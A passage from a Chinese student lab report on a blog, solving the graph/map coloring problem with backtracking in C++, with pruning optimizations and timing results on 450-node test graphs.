<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>算法设计与分析 实验三 回溯法求解地图填色问题 - 编程小白</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程小白" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程小白</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">算法设计与分析 实验三 回溯法求解地图填色问题</h1>
			
		</header>
		<div class="content post__content clearfix">
			


                <div id="content_views" class="markdown_views prism-atom-one-light">
                    
                        
                    
                    <p></p>
<div class="toc">
 <h3>回溯法求解地图填色问题</h3>
 <ul>
<li><a href="#_2">一、实验目的与要求</a></li>
<li>
<ul>
<li><a href="#1_3">1、实验基本要求：</a></li>
<li><a href="#2_7">2、实验亮点：</a></li>
</ul>
  </li>
<li><a href="#_14">二、实验内容与方法</a></li>
<li><a href="#_24">三、实验步骤与过程</a></li>
<li>
<ul>
<li><a href="#1_25">1、未优化的回溯：</a></li>
<li>
<ul>
<li><a href="#1_26">（1）算法描述：</a></li>
<li><a href="#2_34">（2）编程实现</a></li>
<li><a href="#3_63">（3）运行并测试：</a></li>
</ul>
   </li>
<li><a href="#2_84">2、对回溯进行优化（本部分中时间消耗均为完备搜索的时间消耗）：</a></li>
<li>
<ul>
<li><a href="#1_87">（1）贪心剪枝策略：</a></li>
<li><a href="#2_124">（2）置换剪枝策略：</a></li>
<li><a href="#3_137">（3）向前探查剪枝策略：</a></li>
<li><a href="#4_153">（4）矩阵记录可行解避免多次搜索</a></li>
<li><a href="#5_247">（5）数据结构的选择：</a></li>
</ul>
   </li>
<li><a href="#3_279">3、时间与效率分析：</a></li>
<li>
<ul>
<li><a href="#1_281">（1）三组数据的涂色：</a></li>
<li><a href="#2_297">（2）自行生成地图涂色并分析：</a></li>
</ul>
  </li>
</ul>
  </li>
<li><a href="#_340">四、实验结论或体会</a></li>
<li><a href="#_348">五、思考</a></li>
<li>
<ul>
<li><a href="#1_350">1、算法描述：</a></li>
<li><a href="#2_354">2、运行并测试：</a></li>
</ul>
  </li>
<li><a href="#_357">附录：</a></li>
</ul>
</div>
<p></p> 
<h1>
<a id="_2"></a>一、实验目的与要求</h1> 
<h2>
<a id="1_3"></a>1、实验基本要求：</h2> 
<p>（1）掌握回溯法算法设计思想。<br> （2）掌握地图填色问题的回溯法解法。</p> 
<h2>
<a id="2_7"></a>2、实验亮点：</h2> 
<p>（1）通过回溯法完成了实验，并验证了结果的正确性。<br> （2）在使用回溯法的基础上，从贪心剪枝，置换剪枝，向前探查剪枝，矩阵记录和选择邻接表进行数据存储5个方面对程序进行优化，大幅降低程序运行时间并在附件中上传了所有实验过程中的输出结果并对结果都进行了验证。<br> （3）通过实际操作与理论分析结合的方式，从图规模，合法涂色数，图的边密度和图的连通分量四个方面分析对比算法的效率。<br> （4）有针对性地探究了找到全部可行解的方法。<br> （5）最后思考并探究了轮换等有效剪枝策略，极大提高算法效率。</p> 
<h1>
<a id="_14"></a>二、实验内容与方法</h1> 
<p><strong>背景知识：</strong><br> 为地图或其他由不同区域组成的图形着色时，相邻国家/地区不能使用相同的颜色。 我们可能还想使用尽可能少的不同颜色进行填涂。一些简单的“地图”（例如棋盘）仅需要两种颜色（黑白），但是大多数复杂的地图需要更多颜色。<br> 每张地图包含四个相互连接的国家时，它们至少需要四种颜色。1852年，植物学专业的学生弗朗西斯·古思里（Francis Guthrie）于1852年首次提出“四色问题”。他观察到四种颜色似乎足以满足他尝试的任何地图填色问题，但他无法找到适用于所有地图的证明。这个问题被称为四色问题。长期以来，数学家无法证明四种颜色就够了，或者无法找到需要四种以上颜色的地图。直到1976年德国数学家沃尔夫冈·哈肯（Wolfgang Haken）（生于1928年）和肯尼斯·阿佩尔（Kenneth Appel，1932年-2013年）使用计算机证明了四色定理，他们将无数种可能的地图缩减为1936种特殊情况，每种情况都由一台计算机进行了总计超过1000个小时的检查。<br> 他们因此工作获得了美国数学学会富尔克森奖。在1990年，哈肯（Haken）成为伊利诺伊大学（University of Illinois）高级研究中心的成员，他现在是该大学的名誉教授。<br> 四色定理是第一个使用计算机证明的著名数学定理，此后变得越来越普遍，争议也越来越小 更快的计算机和更高效的算法意味着今天您可以在几个小时内在笔记本电脑上证明四种颜色定理。</p> 
<p><strong>问题描述：</strong><br> 我们可以将地图转换为平面图，每个地区变成一个节点，相邻地区用边连接，我们要为这个图形的顶点着色，并且两个顶点通过边连接时必须具有不同的颜色。附件是给出的地图数据，请针对三个地图数据尝试分别使用5个（le450_5a），15个（le450_15b），25个（le450_25a）颜色为地图着色。</p> 
<h1>
<a id="_24"></a>三、实验步骤与过程</h1> 
<h2>
<a id="1_25"></a>1、未优化的回溯：</h2> 
<h3>
<a id="1_26"></a>（1）算法描述：</h3> 
<p>a. 拓展当前节点，并对当前节点进行搜索<br> b. 判断当前节点是否存在可行解，如果存在则进入c，如果不存在，则回溯上一节点，并进入a<br> c. 判断是否搜索结束，如果结束则直接输出结果并停止搜索；如果未结束，则进入a<br> d. 当全部搜索完毕后仍不存在可行解，则输出无解</p> 
<p>未经过优化的回溯算法流程图大致如下<br> <img src="https://images2.imgbox.com/66/70/6oww4E11_o.png" alt="在这里插入图片描述"></p> 
<h3>
<a id="2_34"></a>（2）编程实现</h3> 
<p>大致代码如下：</p> 
<pre><code class="prism language-cpp"><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">//如果已经涂完整个地图，即找到可行解</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&gt;</span> n<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        ans<span class="token operator">++</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">//对每个点进行涂色</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        color<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span><span class="token comment">//模拟涂色</span>
        <span class="token comment">//进行涂色的合法性检测</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> x<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>g<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> color<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> color<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                b <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token comment">//非法，重新染色</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            b <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token function">dfs</span><span class="token punctuation">(</span>x <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//当前解合法，对当前节点进行拓展搜索</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<h3>
<a id="3_63"></a>（3）运行并测试：</h3> 
<p>为了对算法进行测试，我选择了实验时给定的如下地图数据，并进行填涂尝试。<br> <img src="https://images2.imgbox.com/01/cd/zKgbhgS4_o.png" alt="在这里插入图片描述"><br> <strong>①图像数据文字化：</strong><br> 由于对于代码而言，不能够存储图像，因此需要将图像数据转为邻接矩阵进行图的存储。<br> <img src="https://images2.imgbox.com/01/c3/ipnnJrMU_o.png" alt="在这里插入图片描述"><br> 将每个小块看成图的一个点，将图与图之间的邻接关系映射成点与点之间的连边。</p> 
<p><strong>②进行小数据试涂：</strong><br> 采用输入流将每个连边读入后调用函数进行计算，并通过输出流将结果输出（全部运行结果在‘result’-&gt;‘9_4_480.txt’中）并利用系统函数进行计时，可得对于这个给定地图，未优化的回溯在0.8544ms下找到全部480个解。<br> <img src="https://images2.imgbox.com/7d/25/iSiwYcZ9_o.png" alt="在这里插入图片描述"><br> <strong>③涂色正确性检验：</strong><br> 完成了对地图的涂色后，务必对算法进行正确性检验以证明我们的涂色方案是正确的。</p> 
<p>易知，涂色的正确性检验即检测所填涂地图中相邻的边的涂色是否相同，如果相同则为非法涂色，如果所有相邻点涂色都不同则涂色合法。</p> 
<p>检测方法也相对简单，仅需遍历整个边集，并依次对相邻点进行颜色检验即可。通过检验，②中试涂的480个结果全部正确。证明回溯算法具有正确性。<br> <strong>④大数据试涂：</strong><br> 完成了小数据下的试涂后，尝试对大数据进行涂色，不过发现对附件中450点使用5色填涂不能在短时间内运行结束，并且运行比较长一段时间（12h+）也很难得到结果。这说明，常规的回溯算法只适用于数量级较小的数据，<strong>回溯算法亟待优化</strong>。</p> 
<h2>
<a id="2_84"></a>2、对回溯进行优化（本部分中时间消耗均为完备搜索的时间消耗）：</h2> 
<p>从上面的实验中，我们可以知道，常规的回溯算法耗时很长，而且搜索效率较慢，只能处理较低数量级的数据。因此需要对算法进行一系列优化。通过对运算过程的分析与计算，提出了如下几种可行的优化方案：（每种优化方案均进行了测试，并将测试结果存在‘result’文件夹中）</p> 
<h3>
<a id="1_87"></a>（1）贪心剪枝策略：</h3> 
<p><strong>①算法描述：</strong><br> 通过分析，我们不难发现，对于搜索过程中产生的搜索树最大深度一定，但分支数很大，因此需要采用策略去降低搜索树的分支个数，从而对搜索树进行剪枝。<br> 通过分析，我们可以知道，对于每次搜索出的节点，拓展的节点为当前的可行解个数。而且，<strong>分支产生的越早，分支就会产生的越多</strong>。因此，需要降低搜索树树根处分支数，尽量将分支数靠近叶子节点，从而进行贪心剪枝。<br> <img src="https://images2.imgbox.com/ba/d5/d3Os9pqX_o.png" alt="在这里插入图片描述"><br> 通过分析可以得知，不论从哪个点开始搜索，得到的可行解不变。因此，只需从度数大的点开始搜起，并依次按照点度数降序顺序依次搜索，直至搜索到最后一个点即可。</p> 
<p><strong>②具体实现：</strong><br> 本算法的具体实现相对简单，只需在最开始读入图数据之后，进行搜索之前按照点度数降序排序对图进行重构，再进行搜索即可。</p> 
<pre><code class="prism language-cpp"><span class="token comment">//比较点度数函数</span>
<span class="token keyword">bool</span> <span class="token function">comp</span><span class="token punctuation">(</span><span class="token keyword">const</span> MapNode tmp1<span class="token punctuation">,</span> <span class="token keyword">const</span> MapNode tmp2<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> tmp1<span class="token punctuation">.</span>value <span class="token operator">&lt;</span> tmp2<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//排序重构函数</span>
<span class="token keyword">void</span> <span class="token function">arraySort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

        <span class="token function">sort</span><span class="token punctuation">(</span>vArray <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> vArray <span class="token operator">+</span> vNum <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> comp<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> vNum<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            oldToNew<span class="token punctuation">[</span>vArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
            newToOld<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> vArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>id<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

</code></pre> 
<p><strong>③运行并测试：</strong><br> 对给定的大数据（450点5色）进行填涂，并将可行解全部输出，将程序运行20次取时间平均值做表如下：</p> 
<table>
<thead><tr>
<th>优化前</th>
<th>优化后</th>
</tr></thead>
<tbody><tr>
<td>449.4s</td>
<td>109.4s</td>
</tr></tbody>
</table>
<p>这证明，使用贪心算法进行优化是切实有效的优化方式，但算法的运行时间仍然比较长，需要进一步优化。</p> 
<h3>
<a id="2_124"></a>（2）置换剪枝策略：</h3> 
<p><strong>①算法描述：</strong><br> 通过观察第一次优化输出的可行解，我们不难发现，在起始搜索点的不同涂色方案下的可行解个数相同，这是因为对于第一个搜索点而言，不同涂色下的各个填涂方案是对称的。即对于在涂色<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         x
        
        
         0
        
       
      
      
       x_0
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.58056em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span></span></span></span></span>下的解向量<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         S
        
        
         0
        
       
       
        =
       
       
        (
       
       
        
         x
        
        
         0
        
       
       
        ,
       
       
        
         x
        
        
         1
        
       
       
        ,
       
       
        
         x
        
        
         2
        
       
       
        ,
       
       
        
         x
        
        
         3
        
       
       
        ,
       
       
        …
       
       
        )
       
      
      
       S_0=(x_0,x_1,x_2,x_3,… )
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.83333em;vertical-align: -0.15em"></span><span class="mord"><span class="mord mathdefault" style="margin-right: 0.05764em">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: -0.05764em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.277778em"></span><span class="mrel">=</span><span class="mspace" style="margin-right: 0.277778em"></span></span><span class="base"><span class="strut" style="height: 1em;vertical-align: -0.25em"></span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em"><span class="" style="margin-left: 0em;margin-right: 0.05em"><span class="pstrut" style="height: 2.7em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em"><span class=""></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right: 0.166667em"></span><span class="minner">…</span><span class="mclose">)</span></span></span></span></span>，可以映射出<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        n
       
       
        −
       
       
        1
       
      
      
       n-1
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.66666em;vertical-align: -0.08333em"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right: 0.222222em"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em"></span></span><span class="base"><span class="strut" style="height: 0.64444em;vertical-align: 0em"></span><span class="mord">1</span></span></span></span></span>（n为可用颜色数）个等效可行解。因此搜索时只需固定第一个点，并将搜索出来的可行解个数乘以可用颜色数即可。大约可以将实际运行时间缩短至原来的<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        
         1
        
        
         n
        
       
      
      
       frac{1}{n}
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 1.19011em;vertical-align: -0.345em"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.845108em"><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">n</span></span></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="frac-line" style="border-bottom-width: 0.04em"></span></span><span class=""><span class="pstrut" style="height: 3em"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.345em"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span>（<span class="katex--inline"><span class="katex"><span class="katex-mathml">
    
     
      
       
        n
       
      
      
       n
      
     
    </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.43056em;vertical-align: 0em"></span><span class="mord mathdefault">n</span></span></span></span></span>为可用颜色数）。<br> <strong>②具体实现：</strong><br> 本算法的具体实现很简单，只需在搜索时固定第一个颜色即可</p> 
<p><strong>③运行并测试：</strong><br> 对给定的大数据（450点5色）进行填涂，并将可行解全部输出，将程序运行20次取时间平均值做表如下：</p> 
<table>
<thead><tr>
<th>优化前</th>
<th>优化后</th>
</tr></thead>
<tbody><tr>
<td>679s</td>
<td>140.4s</td>
</tr></tbody>
</table>
<p>这证明，使用置换剪枝策略进行优化是切实有效的优化方式，但算法的运行时间仍然比较长，需要进一步优化。</p> 
<h3>
<a id="3_137"></a>（3）向前探查剪枝策略：</h3> 
<p><strong>①算法描述：</strong><br> 在搜索过程中，对于一些无解的节点，可以做到提前探查，即拓展节点前先对是否存在可行解进行检查，如果不存在可行解，则剪枝并返回。<br> <img src="https://images2.imgbox.com/0d/54/Fl5jagdR_o.png" alt="在这里插入图片描述"><br> <strong>②具体实现：</strong><br> 在本题中，采用了colorMatrix数组对每个点可以使用的颜色进行计数。并在回溯搜索时对当前点的合法颜色进行检测，如果没有则直接返回，无需拓展。</p> 
<p><strong>③运行并测试：</strong><br> 对给定的大数据（450点5色）进行填涂，并将可行解全部输出，将程序运行20次取时间平均值做表如下：</p> 
<table>
<thead><tr>
<th>优化前</th>
<th>优化后</th>
</tr></thead>
<tbody><tr>
<td>264.1s</td>
<td>249.5s</td>
</tr></tbody>
</table>
<p>这证明，使用向前探查剪枝策略进行优化是有效的优化方式，但优化并不十分明显。</p> 
<h3>
<a id="4_153"></a>（4）矩阵记录可行解避免多次搜索</h3> 
<p><strong>①算法描述：</strong><br> 在进行回溯搜索过程中，每次对点进行颜色合法性检查时都要遍历当前点，每一次每一层的搜索都需要检查合法性，成千上万次操作将大大提高这部分的时间消耗。而每次拓展节点时，新节点与原节点都会有公共边，因而点的可用性不会差别特别大，因此，可以设计一个数组对每个点的可用性进行检测并存储，从而避免多次对可用性的检测。</p> 
<p><strong>②具体实现：</strong><br> 为了存储每个点的颜色可用性，设置了colorMatrix进行存储。其中，colorMatrix[i][1]表示第i点1颜色是否可用（可用为1，反之为0），colorMatrix[j][2]表示第j点2颜色是否可用（可用为1，反之为0）。特殊地，colorMatrix[i][0]表示第i点共有几种可用颜色<br> 因此对于每个点回溯时，只需通过colorMatrix遍历点i的可用颜色，再删除邻接点colorMatrix可用颜色并继续搜索即可。完成搜索则恢复该可用颜色即可。</p> 
<p><strong>a.搜索函数：</strong></p> 
<pre><code class="prism language-cpp"><span class="token comment">//backtrack to search</span>
<span class="token keyword">void</span> <span class="token function">backtrack</span><span class="token punctuation">(</span>Map <span class="token operator">&amp;</span>map<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> rest<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">//judge if find the solution</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>rest <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">//store the solution</span>
        result<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token punctuation">(</span>map<span class="token punctuation">.</span>colorArray <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> map<span class="token punctuation">.</span>colorArray <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> map<span class="token punctuation">.</span>vNum<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> map<span class="token punctuation">.</span>vNum<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            ofs <span class="token operator">&lt;&lt;</span> result<span class="token punctuation">[</span>result<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        ofs <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">//dissatisfied solution: check each valid color</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> map<span class="token punctuation">.</span>colorType<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span>colorMatrix<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token comment">//if the color solution is invalid</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">deleteColor</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> index<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token function">recoverColor</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> index<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token comment">//search point[index]</span>
            map<span class="token punctuation">.</span>colorArray<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>
            <span class="token comment">//backtrack to search</span>
            <span class="token function">backtrack</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> <span class="token function">next</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">,</span> rest <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//recover the validation of the color and return</span>
            map<span class="token punctuation">.</span>colorArray<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token function">recoverColor</span><span class="token punctuation">(</span>map<span class="token punctuation">,</span> index<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> 
<p>首先回溯函数中对是否为解进行判断，如果是解，则将结果存入结果容器中，并直接返回。<br> 如果当前不为可行解，且当前点没有合法可用颜色，则进入下一个点的判断。如果有可用颜色，则对当前节点的可用颜色进行拓展，并使用colorMatrix对颜色情况进行记录，搜索前删除该可用颜色，搜索后恢复该可用颜色。</p> 
<p><strong>b.恢复颜色函数：</strong></p> 
<pre><code class="prism language-cpp"><span class="token keyword">void</span> <span class="token function">recoverColor</span><span class="token punctuation">(</span>Map <span class="token operator">&amp;</span>map<span class="token punctuation">,</span> <span class="token keyword">int</span> index<span class="token punctuation">,</span> <span class="token keyword">int</span> color<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    MapNode candidate <span class="token operator">=</span> map<span class="token punctuation">.</span>vArray<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
    MapNode <span class="token operator">*</span>tmp <span class="token operator">=</span> candidate<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>tmp<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">int</span> candidateIndex <span class="token operator">=</span> tmp<span class="token operator">-</span><span class="token operator">&gt;</span>value<span class="token punctuation">;</span>
        <span class="token comment">//if the point is uncolored and its adjacent point is not colored with that color</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>map<span class="token punctuation">.</span>colorArray<span class="token punctuation">[</span>candidateIndex<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> map<span class="token punctuation">.</span>colorMatrix<span class="token punctuation">[</span>candidateIndex<span class="token punctuation">]</span><span class="token punctuation">[</span>color <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">+</span> index<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            map<span class="token punctuation">.</span>colorMatrix<span class="token punctuation">[</span>candidateIndex<span class="token punctuation">]</span><span class="token punctuation">[</span>color <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
